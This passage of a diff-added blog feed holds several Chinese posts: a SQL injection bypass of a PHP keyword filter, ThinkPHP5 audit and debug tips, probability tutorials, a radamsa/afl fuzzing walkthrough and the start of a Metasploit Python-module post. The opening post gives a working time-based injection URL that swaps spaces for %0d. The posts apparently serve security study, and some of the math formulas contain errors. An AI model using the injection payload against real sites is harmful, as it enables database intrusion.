+        $str = trim($str);
+        $str = self::limitLen($str,$limitLen);
+        $str = htmlspecialchars($str,ENT_NOQUOTES);
+        return self::addSlash($str);
+    }
+    
+  
+    public static function word($str)
+    {
+        $word = array(&quot;select &quot;,&quot;select/*&quot;,&quot;update &quot;,&quot;update/*&quot;,&quot;delete &quot;,&quot;delete/*&quot;,&quot;insert into&quot;,&quot;insert/*&quot;,&quot;updatexml&quot;,&quot;concat&quot;,&quot;()&quot;,&quot;/**/&quot;,&quot;union(&quot;);
+        foreach($word as $val)
+        {
+            if(stripos($str,$val) !== false)
+            {
+                return '';
+            }
+        }
+        return self::removeEmoji($str);
+    }
+
+</code></pre>
+
+<p>不允许<code>union</code>加空格,可是空格的代替很多 比如 <code>%0d</code></p>
+
+<p>poc</p>
+
+<pre><code>/index.php?controller=seller&amp;action=categoryAjax&amp;id[]=1%20and%201=1%20union%0dselect%0d1,2,3,4,5,6,7,8,sleep(5)
+
+</code></pre>]]></content></item><item><title>think5审计与调试技巧1</title><link>https://blue-bird1.github.io/posts/thinkphp5-1/</link><pubDate>Thu, 17 Jan 2019 23:19:42 +0800</pubDate><guid>https://blue-bird1.github.io/posts/thinkphp5-1/</guid><description>&lt;h3 id=&#34;think5审计与调试技巧1&#34;&gt;think5审计与调试技巧1&lt;/h3&gt;</description><content type="html"><![CDATA[<h3 id="think5审计与调试技巧1">think5审计与调试技巧1</h3>
+
+<p>think5是一个非常流行的框架, 现在的cms很多都采用了think5作为开发框架.这就带来一个问题, 没用过的安全人员审计的时候就非常懵逼了.</p>
+
+<p>例如 程序入口在哪?  orm操作都是这种函数  <code>Db::name($modeln['tablename'])-&gt;where('id',$id)-&gt;setInc('click');</code>  怎么操作才会出现sql注入?</p>
+
+<p>这就需要框架知识了,但是学习整个框架又太多, 不学又不知道怎么审计.所以这个系列旨在带来足以审计的think5框架知识,而不太复杂</p>
+
+<h4 id="整体目录结构">整体目录结构</h4>
+
+<p>think5 主要需要关注的目录如下</p>
+
+<pre><code>├── application 应用目录（可设置）
+├── config 配置目录 
+├── extend 扩展类库目录（可定义）
+├── public 网站目录
+├── route   路由
+├─- runtime  应用的运行时目录（可写，可设置）
+├── thinkphp 框架目录
+└── vendor 第三方库
+</code></pre>
+
+<p>我们审计主要看<code>application</code> 目录</p>
+
+<p>5.0 官方给的目录参考是</p>
+
+<pre><code>├─application           应用目录（可设置）
+│  ├─common             公共模块目录（可更改）
+│  ├─index              模块目录(可更改)
+│  │  ├─config.php      模块配置文件
+│  │  ├─common.php      模块函数文件
+│  │  ├─controller      控制器目录
+│  │  ├─model           模型目录
+│  │  ├─view            视图目录
+│  │  └─ ...            更多类库目录
+│  ├─command.php        命令行工具配置文件
+│  ├─common.php         应用公共（函数）文件
+│  ├─config.php         应用（公共）配置文件
+│  ├─database.php       数据库配置文件
+│  ├─tags.php           应用行为扩展定义文件
+│  └─route.php          路由配置文件
+</code></pre>
+
+<p>但是事实可能缺失很多部分 例如<code>nonecms</code> 的目录是</p>
+
+<pre><code>
+├── admin
+│   ├── behavior
+│   ├── config
+│   ├── controller
+│   ├── rbac.php
+│   ├── tags.php
+│   ├── validate
+│   └── view
+├── command.php
+├── common
+│   ├── lib
+│   ├── model
+│   └── taglib
+├── common.php
+├── index
+│   ├── config
+│   └── controller
+├── mobile
+│   ├── config
+│   └── controller
+└── push
+    ├── controller
+    └── service
+</code></pre>
+
+<h4 id="think5-url">think5 url</h4>
+
+<p>最常见的think5 url是</p>
+
+<p><code>http://serverName/index.php（或者其它应用入口文件）/模块/控制器/操作/[参数名/参数值...]</code></p>
+
+<p><code>http://serverName/index.php（或者其它应用入口文件）?s=/模块/控制器/操作/[参数名/参数值...]</code></p>
+
+<p>像</p>
+
+<p><code>index.php/index/blog/read</code> <code>index.php?s=/index/blog/read</code></p>
+
+<p>其他方式也有 但是基本大同小异 例如<code>index/listing/index/cid/47.html</code></p>
+
+<h4 id="配置文件">配置文件</h4>
+
+<p>think5.1 配置文件在config目录  5.0在<code>application/config.php</code></p>
+
+<p>常见的配置文件</p>
+
+<p><code>app.php  cache.php  cookie.php  database.php  log.php  session.php  template.php  trace.php</code></p>
+
+<p>最重要的配置文件是<code>app.php</code></p>
+
+<p>主要需要关注的配置如下</p>
+
+<pre><code>// 应用调试模式
+'app_debug'              =&gt; true,
+// 应用Trace
+'app_trace'              =&gt; true,
+// 默认全局过滤方法 用逗号分隔多个
+'default_filter'         =&gt; '',
+// 禁止访问模块
+'deny_module_list'       =&gt; ['common'],
+</code></pre>
+
+<p><code>app_debug</code> 和 <code>app_trace</code> 建议设置成true.</p>
+
+<p>调试模式下异常会显示详细信息,而不是通用报错界面</p>
+
+<p><code>app_trace</code> 则会在右下角显示一个按钮,根据设置可以显示执行路径,执行sql等等</p>
+
+<p>如果没有显示,需要添加</p>
+
+<pre><code>// Trace信息
+'trace'     =&gt;  [
+    //支持Html,Console
+    'type'  =&gt;  'html',
+] 
+</code></pre>
+
+<p>如果没有看到这个设置  可能在<code>trace.php</code>中设置</p>
+
+<pre><code>&lt;?php
+return [
+    // 内置Html Console 支持扩展
+    'type' =&gt; 'Html',
+];
+</code></pre>
+
+<p><code>xxx.php</code> 对应的是<code>app.php</code>里的<code>xxx</code>设置</p>
+
+<p><code>default_filter</code> 可能的值是函数, 例如 <code>strip_tags</code> 等于对所有用户传入的参数执行过滤.</p>
+
+<p><code>deny_module_list</code> 则是禁止访问的模块</p>
+
+<h4 id="日志">日志</h4>
+
+<p><code>config/log.php</code></p>
+
+<pre><code>return [
+    // 日志记录方式，内置 file socket 支持扩展
+    'type'  =&gt; 'File',
+    // 日志保存目录
+    'path'  =&gt; '',
+    // 日志记录级别
+    'level' =&gt; [],
+];
+</code></pre>
+
+<p>默认路径是在<code>runtime/log</code></p>
+
+<h4 id="数据库trace">数据库trace</h4>
+
+<p><code>app_trace</code>设置后会发现并没有sql记录,这个需要在database.php添加</p>
+
+<pre><code>'debug'       =&gt; true,
+</code></pre>
+
+<p>不过就算你看到你的sql注入进入了显示的语句, 但是由于thinkphp5的参数绑定, 很可能并没有生效.</p>
+
+<h4 id="路由">路由</h4>
+
+<p>路由对审计影响其实不大, 毕竟url怎么改, 真正的执行代码也不会变.建议扫描性的看一下,是否有开发不小心把调试用的路由留在上面了..</p>]]></content></item><item><title>统计学2:现代概率</title><link>https://blue-bird1.github.io/posts/statistics2/</link><pubDate>Mon, 07 Jan 2019 21:20:23 +0800</pubDate><guid>https://blue-bird1.github.io/posts/statistics2/</guid><description>&lt;h4 id=&#34;统计学2-现代概率&#34;&gt;统计学2: 现代概率&lt;/h4&gt;
+&lt;p&gt;现代概率的一大特征是概率不确定性.古代概率研究的骰子可以认为每面的概率是1/6, 但是统计天气的时候, 就没有理由认为晴天和雨天的概率都是1/2.&lt;/p&gt;</description><content type="html"><![CDATA[<h4 id="统计学2-现代概率">统计学2: 现代概率</h4>
+
+<p>现代概率的一大特征是概率不确定性.古代概率研究的骰子可以认为每面的概率是1/6, 但是统计天气的时候, 就没有理由认为晴天和雨天的概率都是1/2.</p>
+
+<p>概率函数在骰子只是简单的$\rho(任意一个数)= \frac{1}{6}$  . 在复杂的现实情况使用简单的函数是无法描述的.</p>
+
+<h4 id="偏差和方差">偏差和方差</h4>
+
+<p>如果怀疑赌场的骰子大小游戏有问题, 要怎么去验证它这个问题. 一种思路是认为如果1,2,3,4,5,6出现的概率不一样 就是有问题. 换种等价方法描述就是 骰子期望$E(X)=3.5$ . 这个骰子均值也应该是3.5.</p>
+
+<p>那么衡量离理想骰子距离也有几种方法 除了最简单的均值.</p>
+
+<p>偏差 所有发生事件 $X = [x_1, x_2 &hellip; x_n]$  偏差 $ =  \sum_n E(X) - x_n$</p>
+
+<p>例如连续出现5个6    $6*5  - 3.5*5 = 2.5*5$     但是连续5个6并不是现实的小概率事件.  如果发生连续5个6就认为骰子有问题显然是不行的.  而且偏差求的是平均, 两边偏差会抵消  $[3,4,3,4]$ 这种的偏差也是0,</p>
+
+<p>方差则是偏差的平方 $ \sum_n (E(X) - x_n)^2$ 方差是一个衡量离散度的标准</p>
+
+<h4 id="大数定律">大数定律</h4>
+
+<p>我们已经知道统计会出现偏差, 那么如何确定偏差是否是骰子本身的问题呢. 初中就有教, 统计次数越大, 越可能接近均值.</p>
+
+<p>用数学表达就是伯努利大数律 任意给定两个数 $\epsilon$, $\eta$ .含义分别是离均值的距离和离均值的概率. 事件总值是$X$, 存在一个抽取次数$N$ 使得 $\rho(| \frac{X}{N}|&gt;\epsilon ) &lt; \eta$</p>
+
+<p>伯努利证明时并没有方差, 但是他还是用概率的方法证明了.</p>
+
+<blockquote>
+<p>证明参考 数理统计学简史 第一章注3</p>
+</blockquote>
+
+<p>现在我们知道只是切比雪夫不等式的一个推论.</p>
+
+<p>$\rho(|X-E(X)| &gt; b\sigma) \geq \frac{1}{b^2}$   $\sigma$ 是方差的平方根 也叫标准差 X是随机变量</p>
+
+<p>这个不等式之前还有一个马可夫不等式</p>
+
+<p>$P(X\geq a) \leq  \frac{E(x)}{a}$</p>
+
+<p>这个就比较容易理解了. 如果a取值范围是在x之间.</p>
+
+<p>将$Y=(X-\epsilon)^2$  $a=(kσ)^2$代入马可夫不等式</p>
+
+<p>$\rho((X-\epsilon)^2)\geq kσ^2)\leq \frac{E(X-\epsilon)^2}{kσ^2)} = \frac{σ^2}{kσ^2} =\frac{1}{k^2} $</p>
+
+<h4 id="概率函数和累计分布函数">概率函数和累计分布函数</h4>
+
+<p>如果随机变量是X,</p>
+
+<p>概率函数$\rho$</p>
+
+<p>$\rho(x) = x的概率$</p>
+
+<p>硬币抛出多少次正面的概率分布. 因为只有两个可能性的情况太常见,也被称为二次分布.</p>
+
+<p>n是总数量 k是正的数量 p是正的概率 二项式分布 $b(n, k, p ) = \frac{n!}{k!(n-k)!}p^k(1-p)^{n-k} $</p>
+
+<p>前面组合公式很显然, 后面$p^k$是抛出这么多次正面的概率  $(1-p)^{n-k}$则相反</p>
+
+<p>用二项分布可以计算出硬币概率分布  $ \rho(k)=\frac{n!}{k!(n-k)!}\frac{1}{2}^k\frac{1}{2}^{n-k}$</p>
+
+<p>它的期望是$E(X) = np$  因为二项分布是n次相同实验组合的. 不管抛多少次 期望都是正面的几率$p$ 再乘以总数量</p>
+
+<p>方差是$\sigma^2 = np(1-p)$</p>
+
+<p>累计分布函数f是</p>
+
+<p>$\rho(X \leq x) =f(x)$</p>
+
+<p>分布函数是概率函数的积分, 所以最终将变成1,</p>
+
+<h4 id="贝叶斯公式">贝叶斯公式</h4>
+
+<p>我们在概率定义知道 独立变量a,b有  $P(b|a) = P(a,b)/P(a)$ 和$P(a,b) = P(a|b)*P(b)$</p>
+
+<p>将后项带入前项 得$P(b|a) =  P(a|b)*P(b)/P(a)$</p>
+
+<p>独立变量, 也就是两个变量不相互影响. 天气自然是和骰子没什么关系, 但是骰子掷出双数和骰子掷出6自然是有关系. 在概率学上的定义是协方差, X, Y的期望值是$\mu$和$v$</p>
+
+<p>$Cov(X, Y) = E((X-\mu)(Y-v))$</p>
+
+<p>为什么这么定义呢. 这两个期望分开定义 都是0.  现在放到一起如果不是0, 说明存在相互影响. 期望值的大小也代表影响的方向</p>
+
+<h4 id="二项分布逼近">二项分布逼近</h4>
+
+<p>高斯分布可谓是第一重要的分布  它其实是二项分布的逼近, 然后得出的函数.</p>
+
+<p>在历史上首先研究这个问题的是棣莫弗, 他一开始研究的对象 是$b(2m, <sup>1</sup>&frasl;<sub>2</sub>, m)$</p>
+
+<p>m是2m的中项 然后  $b(m)/b(m+d)$ 中项和偏离中项的关系</p>
+
+<p>然后他的朋友斯特林出现, 并使用斯特林公式算了一下</p>
+
+<p>$b(2m, <sup>1</sup>&frasl;<sub>2</sub>. m) \approx \frac{2}{mn}$</p>
+
+<p>$\frac{b(m+d)}{bm}\approx e^-\frac{2d^2}{n}$</p>
+
+<p>$b(m+d) \approx  \frac{2}{\sqrt{2πn}}  e^-\frac{2d^2}{n} $</p>
+
+<blockquote>
+<p>使用上式的结果，并在二项概率累加求和的过程中近似的使用定积分代替求和，得到</p>
+
+<p>$p<em>d  \approx  \sum</em>{-d\leq  m-i\leq d} \frac{2}{\sqrt{2πn}} e^{-2\frac{d}{\sqrt{n}}^2} \approx  \frac{2}{\sqrt{2π}}\int^\frac{d}{\sqrt{n}}<em>{-\frac{d}{\sqrt{n}}} e^{-2x^2}dx  = \frac{1}{\sqrt{2π}}\int^\frac{2d}{\sqrt{n}}</em>{-\frac{2d}{\sqrt{n}}} e^{\frac{x^2}{-2}}dx $</p>
+</blockquote>
+
+<p>将d换成$\frac{c}{\sqrt{n}}$ 可得$ \frac{1}{\sqrt{2π}}\int^{2c}_{-2c} e^{-{\frac{x^2}{2}}}dx $  熟悉的高斯分布</p>
+
+<p>这个公式有什么特殊之处呢 $\frac{1}{\sqrt{2π}}\int^{\infty}_{-\infty} e^{-{\frac{x^2}{2}}}dx =1 ​$</p>
+
+<p>$\int^{\infty}_{-\infty} e^{-{\frac{x^2}{2}}}dx$  也叫高斯积分</p>
+
+<h4 id="参考">参考</h4>
+
+<p>数理统计简史</p>
+
+<p>程序员的数学2</p>
+
+<p>概率论与梳理统计</p>
+
+<p><a href="https://www.qiujiawei.com/shadow-1/">https://www.qiujiawei.com/shadow-1/</a></p>]]></content></item><item><title>统计与概率1 古典概率</title><link>https://blue-bird1.github.io/posts/statistics1/</link><pubDate>Sat, 05 Jan 2019 22:13:04 +0800</pubDate><guid>https://blue-bird1.github.io/posts/statistics1/</guid><description>统计与概率1 古典概率 概率的一个定义是一件事发生的一个情况的几率. 也可以表示成$f(\Omega, \omega, \varrho)$ 古典概率研究的是比较简单的情况, 例如硬币</description><content type="html"><![CDATA[
+
+<h2 id="统计与概率1-古典概率">统计与概率1 古典概率</h2>
+
+<p>概率的一个定义是一件事发生的一个情况的几率. 也可以表示成$f(\Omega, \omega, \varrho)$</p>
+
+<p>古典概率研究的是比较简单的情况, 例如硬币,骰子, 扑克的排列组合. 难度其实也只是低等数学水平, 排列组合问题小学应该就有了. 从常见的问题引入很容易理解, 但是直接看公式可能反而不懂了.</p>
+
+<h4 id="概率的定义和常见错误">概率的定义和常见错误</h4>
+
+<p>当我们谈概率的时候, 例如A城市今年雾霾的几率是30%. 概率的定义是什么,</p>
+
+<p>概率是一件事发生的可能性大小, 但是显然会存在误差. 只有在无限次重复下才会接近, 这是现代的一个定义.</p>
+
+<p>古典概率下因为研究的是硬币, 骰子投掷这类问题, 在没有其他因素下, 完全可以确定一件事情的发生几率.现代概率学研究如人获得某疾病的几率 则需要大量重复的事件来计算.</p>
+
+<p>谈概率当然不能离开事, 在数学定义概率需要 事件的集合$\Omega$ 和概率函数$\rho$ . $\rho$ 给定条件得到发生的几率.</p>
+
+<p>用上面的例子 事件的集合就是 A城市今年每天的天气. $\rho(天气=雾霾) = 0.3$</p>
+
+<p>如果给定两个条件, 就被称为联合概率. 例如 $\rho(天气=雾霾, 日期=星期日)$  . 也就是两件事同时发生的概率.</p>
+
+<p>如果将一个条件作为前提, 则是条件概率 例如$p(天气=雾霾 | 日期=星期天)$ . 也就是发生了第一件事后, 再发生第二件事的概率.</p>
+
+<p>经典的一句话. 炮弹不会落到同一个弹坑  躲炮弹要到炮弹之前落到的地方. 很多人认为这是正确的, 两次也就是概率的平方可能性非常小. 计算是正确的, 但是对于躲炮弹的人 概率中这个事件的集合并不是两次落到同一个弹坑 , 而只是一次.</p>
+
+<blockquote>
+<p>这句话对的原因是因为炮的后坐力</p>
+</blockquote>
+
+<p>黑天鹅事件则是对经济学家的估计概率中的可能性没有小概率事件最好的讽刺</p>
+
+<h4 id="概率计算">概率计算</h4>
+
+<p>概率计算有两种视角, 从单次事件出发和从全局出发.例如</p>
+
+<p>求投掷硬币3次, 3次正面的概率.</p>
+
+<p>从单次事件出发 每次正面的概率是1/2  3次 $\frac{1}{2}^3=\frac{1}{8}$</p>
+
+<p>从全局出发  一次投掷硬币将增加一倍的可能事件 一共可能发生的有$2^3=8$  因为是单次事件得 $\frac{1}{8}$</p>
+
+<p>得到的结果和计算难度差不多 . 但是我们换一个经典的问题</p>
+
+<blockquote>
+<blockquote>
+<p>A,B二人赌博，各出赌金 a 元，他们拥有相同的获胜概率，约定，谁先获得3场胜利，谁获得 10元的全部赌注金，但是由于某种原因，赌博无法进行，此时 A获得了 2 场胜利，B获得了 1场胜利, 那么我们应该怎么把赌注分给两人才算是公平？</p>
+</blockquote>
+</blockquote>
+
+<p>从单次事件出发. 下一局A获胜的概率是1/2, 如果不获胜下一轮获胜的概率也是1/2,  $\frac{1}{2}+\frac{1}{2}^2=\frac{3}{4}$</p>
+
+<p>虽然这道题推导到这就结束了, 但是可以意识到如果离胜局越远 需要计算的越远.</p>
+
+<p>如果从全局出发, 接下来最多可能继续赌2局, 也就是$2^2=4$ 种可能性. 如果乙要赢, 它需要的可能性只有一种. 也就是<code>1/4</code>  甲就是<code>3/4</code></p>
+
+<p>在这里可以清楚的看到这两种思路的差异.一般人在生活中会使用从自身出发的角度, 没什么问题.但是学习统计学, 应该要熟悉的使用从全局出发的角度.</p>
+
+<h4 id="概率之间的关系">概率之间的关系</h4>
+
+<p>如果事件中只有a和b这两个变量.   联合概率$\rho(a, b)$ 是 a和b区域的交集在全部区域的几率.   条件概率$\rho(b|a)$ 是在a区域下, b区域占a区域的几率.  显然这两个概率的差异在于分母. 分别是全部区域和a区域. 而</p>
+
+<p>$a区域/p(a) = 全部区域$</p>
+
+<p>$a和b区域/p(a) = 如果全都是a区域下的b区域数量$</p>
+
+<p>所以</p>
+
+<p>$\rho(b|a) /\rho(a) =\rho(b) $</p>
+
+<p>$p(a,b)/p(a) = p(b|a)$</p>
+
+<h3 id="常用公式">常用公式</h3>
+
+<p>如果从全局出发, 本质是排列组合问题. n个中选择m个的问题.</p>
+
+<p>投掷5次硬币3次是正面的概率, 就是在5次中3次是正面的组合数除以所有可能性.</p>
+
+<p>投掷N次的所有可能性非常好计算 <code>单次可能性数量的N次方</code></p>
+
+<p>公式有几种导出思路.</p>
+
+<p>首先有排列公式 排列与所有可能性的差异在于 每次选择后单次可能性-1  假设n次   排列的是r个</p>
+
+<p>​     $P(n, r) = n(n-1)(n-2)&hellip;(n-r+1)  = n! / (n − r)!$</p>
+
+<p>组合则是不再考虑顺序, 一个组合内的任何可能性都是一样的.所以我们知道一个组合的可能性乘以组合的排列可能性$r!​$ 等于排列公式</p>
+
+<p>$C(n, r)  = P(n, r) /r!$</p>
+
+<p>.</p>
+
+<h4 id="期望">期望</h4>
+
+<p>你预期你下次考试多少分? 预期就是期望. 当你投掷一枚骰子, 出现多少点会认为投出比较大的点数了呢.</p>
+
+<p>期望的一个数学定义是 $E(X) = \int_\Omega Xd\rho $   $\Omega$  是所有事件的集合 $Xd\rho$ 是每种事件的值$X$乘它的概率$d \rho$</p>
+
+<p>例如投一次骰子</p>
+
+<p>$$\operatorname{E}(X)  = 1 \cdot \frac{1}{6} + 2 \cdot \frac{1}{6} + 3 \cdot \frac{1}{6} +4 \cdot \frac{1}{6} + 5 \cdot \frac{1}{6} + 6 \cdot \frac{1}{6} = \frac{1 + 2 + 3 + 4 + 5 + 6}{6} = 3.5$$</p>
+]]></content></item><item><title>Fuzz</title><link>https://blue-bird1.github.io/posts/fuzz/</link><pubDate>Sun, 02 Sep 2018 22:40:07 +0800</pubDate><guid>https://blue-bird1.github.io/posts/fuzz/</guid><description>fuzz工具非常多 如libfuzz honggfuzz KernelFuzzer 也有专注进行web fuzz的wfuzz 但是fuzz功能可以分成两种 只是生成测试用例和检测程序使用测试用</description><content type="html"><![CDATA[
+
+<p>fuzz工具非常多 如<code>libfuzz</code> <code>honggfuzz</code> <code>KernelFuzzer</code> 也有专注进行web fuzz的<code>wfuzz</code> 但是fuzz功能可以分成两种 只是生成测试用例和检测程序使用测试用例后异常  这次使用radamsa和afl作为这两类工具</p>
+
+<h2 id="radamsa">radamsa</h2>
+
+<h3 id="安装">安装</h3>
+
+<p>官方给出的命令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">$ <span class="c1"># please please please fuzz your programs. here is one way to get data for it:</span>
+$ sudo apt-get install gcc make git wget
+$ git clone https://gitlab.com/akihe/radamsa.git <span class="o">&amp;&amp;</span> <span class="nb">cd</span> radamsa <span class="o">&amp;&amp;</span> make <span class="o">&amp;&amp;</span> sudo make install
+$ <span class="nb">echo</span> <span class="s2">&#34;HAL 9000&#34;</span> <span class="p">|</span> radamsa</code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="如何使用">如何使用</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"> $ <span class="nb">echo</span> <span class="s2">&#34;aaa&#34;</span> <span class="p">|</span> radamsa
+ aaaa</code></pre></td></tr></table>
+</div>
+</div>
+<p><code>echo &quot;aaa&quot;</code>可换成任意输出内容的命令 如<code>cat test.txt</code></p>
+
+<p>常用选项</p>
+
+<pre><code>-o / --output 指定输出方法
+-o -    输出到终端
+-o output.txt 输出到文件
+-o :80 网络请求 适用于对服务器程序fuzz
+
+--seek num 指定随机数 用来方便复现
+
+-g | --generators  指定输入
+-g stdio 默认从命令行输出获取
+-g file filename 读文件
+-g random 随机数据
+
+-n 生成数量
+</code></pre>
+
+<h3 id="fuzz-命令行程序">fuzz 命令行程序</h3>
+
+<h4 id="从命令行读取数据">从命令行读取数据</h4>
+
+<p>典型就是<code>md5sum</code>
+测试fuzz命令例子
+<code>echo &quot;test&quot; | radamsa | md5sum  -</code></p>
+
+<p>当然不可能fuzz一次就执行一行命令 编写一个简单的脚本
+shell or python? python!</p>
+
+<pre><code>import os                                                                                                                                                                      
+while True:                                              
+   ret = os.system('echo &quot;test&quot; | radamsa | md5sum -')                                                                                                                       
+</code></pre>
+
+<p>只是简单的单线程执行 但是存在两个问题 如何记录崩溃和崩溃输入 这个时候<code>-seek</code>就能使用了 同时通过判断<code>system</code>函数的返回值 修改为</p>
+
+<pre><code>import os                                                                                                                               num = 0                                       
+while True:                                              
+   ret = os.system('echo &quot;test&quot; | radamsa -seek {}| md5sum -'.format(num))
+   num = num +1
+   if ret != 0:
+      with open（&quot;crash.txt&quot;,&quot;w+&quot;） as f
+      f.write(&quot;{}\n&quot;.format(num))                                                                                                   
+</code></pre>
+
+<p>我们的第一个fuzz程序(虽然这个脚本很简陋)</p>
+
+<h3 id="文件fuzz">文件fuzz</h3>
+
+<p>和命令行主要区别只是读取方式和 文件格式一般会有一定要求 否则不能进入程序执行流程.所以一般fuzz严格的文件格式要使用专门的生成框架.</p>
+
+<p>生成fuzz文件方法很简单
+<code>echo &quot;test&quot; | radamsa --output 'testfile'</code></p>
+
+<p>读取文件生成
+<code>radamsa --output 'testfile'  -g file testfile</code></p>
+
+<h3 id="网络fuzz">网络fuzz</h3>
+
+<p>虽然<code>radmasa</code>提供了这个选项 由于协议格式基本都是一个错误字节就报错 所以推荐使用<code>Mutiny</code>来进行网络fuzz
+<code>echo &quot;test&quot; | radamsa --output ':80'</code></p>
+
+<h2 id="afl">afl</h2>
+
+<h3 id="介绍">介绍</h3>
+
+<p>这款工具除了可以自动从输入fuzz 还能自动检测崩溃 超时. 最大亮点是使用了 编译器插桩 在运行时通过编译时插入的代码可以了解到代码运行路径 覆盖率等信息</p>
+
+<h3 id="安装-1">安装</h3>
+
+<pre><code>wget http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz
+tar -xf afl-latest.tgz
+cd afl*
+make
+make install
+</code></pre>
+
+<h3 id="使用">使用</h3>
+
+<p>常用参数</p>
+
+<pre><code>alf-fuzz programs
+-i 样本目录 fuzz时会使用这些样本生成fuzz文件
+-o 输出目录 生成fuzz文件存放目录
+-n 普通fuzz模式 只有检测崩溃功能 不能检测路径覆盖率
+-q qmeu模式
+
+</code></pre>
+
+<p>例子</p>
+
+<pre><code>afl-fuzz  -i test/markdup/ -o out -n md5sum -  
+</code></pre>
+
+<h2 id="实际操作">实际操作</h2>
+
+<p>从github选一个作为实际对象 我使用高级搜索 指定&gt;500star c语言的项目后随意找了一个</p>
+
+<pre><code>git clone https://github.com/samtools/samtools
+</code></pre>
+
+<p>实际选择指南
+1. star星数是很好的指标 代表发现的漏洞的影响力
+2. 选择 c/c++
+3. 优先选择可以直接编译成程序的 fuzz库还需要去学习怎么写成库入口程序进行fuzz
+4. 优先选择有完善的测试用例的 如jpg xml 或者自带
+5. 代码越多漏洞越多
+6. 如果是本地命令行程序或难以利用的程序 做好发现漏洞被忽略的准备</p>
+
+<p>需要使用afl-gcc执行了编译  常用将gcc替换成afl-gcc的方法 (如果不经常进行编译)</p>
+
+<pre><code>CC=你的afl路径/afl-gcc
+export CC
+</code></pre>
+
+<p>然后</p>
+
+<pre><code>make
+</code></pre>
+
+<p>实际使用编译工具不同 可能需要查询文档 当然你只fuzz不做其他编译直接<code>mv afl-gcc gcc</code>也行</p>
+
+<p>编译</p>
+
+<pre><code>apt-get install autoconf automake make gcc perl zlib1g-dev libbz2-dev liblzma-dev libcurl4-gnutls-dev libssl-dev libncurses5-dev
+git clone https://github.com/samtools/htslib                                          
+git clone https://github.com/samtools/bcftools
+cd samtools
+autoheader
+autoconf -Wno-syntax
+./configure
+</code></pre>
+
+<p>确认输出中的 <code>checking for gcc... xxxx</code> 是你的afl-fuzz 如果不是请执行上面的替换方法</p>
+
+<pre><code>make
+</code></pre>
+
+<p>这个程序提供了测试用例在<code>test</code>目录 如果fuzz其他程序没有提供 就需要自己寻找
+需要注意几点
+1. 尽量覆盖全部可能的格式
+2. 畸形并符合文件格式
+3. 不要存在大量无用数据 像一个3000像素大小的红色正方形图片比一个30像素的 在fuzz时并没有功能提升 只会让fuzz程序大量修改到没有用的图片数据区</p>
+
+<p>这个<code>samtools</code> 有多个功能 我们测试split这个功能 (q:为什么 a:因为我只在这个找到了崩溃 你想试试其他功能和用例也可以)</p>
+
+<pre><code>afl-fuzz -i test/markdup/ -o out samtools split @@  
+</code></pre>
+
+<p>稍等一会 就可以看到产生了崩溃
+<img src="https://i.loli.net/2018/09/23/5ba6a9cb52673.png" alt="" /></p>
+
+<p>停止后 文件保存位置 <code>你选择的输出目录这次是out/crashes/</code></p>
+
+<p>测试崩溃
+<code>./samtools split out/crashes/id:000000,sig:11,src:000015,op:flip2,pos:2</code>
+应用崩溃了
+<code>fish: “./samtools split out/crashes/id…” terminated by signal SIGSEGV (Address boundary error)</code></p>
+
+<h2 id="之后">之后?</h2>
+
+<p>可以选择构造exp当自己的0day 或者提交给开发者 我是倾向于提交给开发者的 而且构造exp已经有很多书籍</p>
+
+<h3 id="提交是什么">提交是什么</h3>
+
+<p>通知开发者程序存在问题 让开发者进行修复。</p>
+
+<h3 id="怎么提交">怎么提交?</h3>
+
+<p>根据程序开发者的不同 具体可能是(非全面)
+1. 小型商业公司 无漏洞奖金计划  我们可以从网上找到它的联系邮件 邮件通知
+2. 大型商业公司 有漏洞奖金计划 使用计划中的提交方式
+3. 开发者 非开源  邮件通知
+4. 开发者 托管在github等 如果问题不大可以直接使用issue 如果是远程利用之类请通知开发者</p>
+
+<p>一般都需要提供以下信息
+1. os信息
+2. 程序版本信息
+3. 崩溃样本
+4. 其他信息</p>
+
+<h3 id="为什么要提交">为什么要提交?</h3>
+
+<p>修复漏洞 防止用户收到攻击 为网络安全做贡献 当然也有其他现实因素 比如危害太小不提交也没用 简历加分等等</p>
+]]></content></item><item><title>metasploit python 模块</title><link>https://blue-bird1.github.io/posts/metasploit1/</link><pubDate>Fri, 02 Feb 2018 22:57:52 +0800</pubDate><guid>https://blue-bird1.github.io/posts/metasploit1/</guid><description>metasploit在2017年尾将python作为官方支持语言,并且已经有python模块加入主分支.这使得我们开发metasploit模</description><content type="html"><![CDATA[
+
+<p>metasploit在2017年尾将python作为官方支持语言,并且已经有python模块加入主分支.这使得我们开发metasploit模块可以不去学习ruby</p>
+
+<h3 id="为什么将python作为官方支持语言">为什么将python作为官方支持语言</h3>
+
+<ol>
+<li>很多不是metasploit官方人员编程的模块都是使用python编写</li>
+<li>现在python流行程度非常高 很多渗透人员python熟练程度比ruby高</li>
+</ol>
+
+<h3 id="metasploit的python模块是什么">metasploit的python模块是什么</h3>
+
+<p>主分支的一个python模块 <a href="https://github.com/rapid7/metasploit-framework/blob/778e69f92912c555e72bc3318278443126704b75/modules/auxiliary/dos/http/slowloris.py">https://github.com/rapid7/metasploit-framework/blob/778e69f92912c555e72bc3318278443126704b75/modules/auxiliary/dos/http/slowloris.py</a></p>
+
+<p>python模块实际是通过json-rpc调用与metasploit通信</p>
+
+<p>metasploit获取元数据如图(来自官方博客)</p>
+
+<pre><code>+------------+
+| Metasploit |
+|            |  Describe yourself  +-------------------+
+|            +-------------------&gt; |  some_module.py   |
+|            |                     |                   |
+|            |                     |                   |
+|            |   Some metadata     |                   |
+|            | &lt;-------------------+                   |
+|            |                     |                   |
+|            |                     +-------------------+
+|            |
+|            |
++------------+
+</code></pre>
+
+<p>模块调用如图</p>
+
+<pre><code>+------------+
+| Metasploit |  Do a thing with
+|            |   these options     +-------------------+
+|            +-------------------&gt; |  some_module.py   |
+|            |                     |                   |
+|            |                     |                   |
+|            |   A bit of status   |                   |
+|            | &lt;-------------------+                   |
+|            |                     |                   |
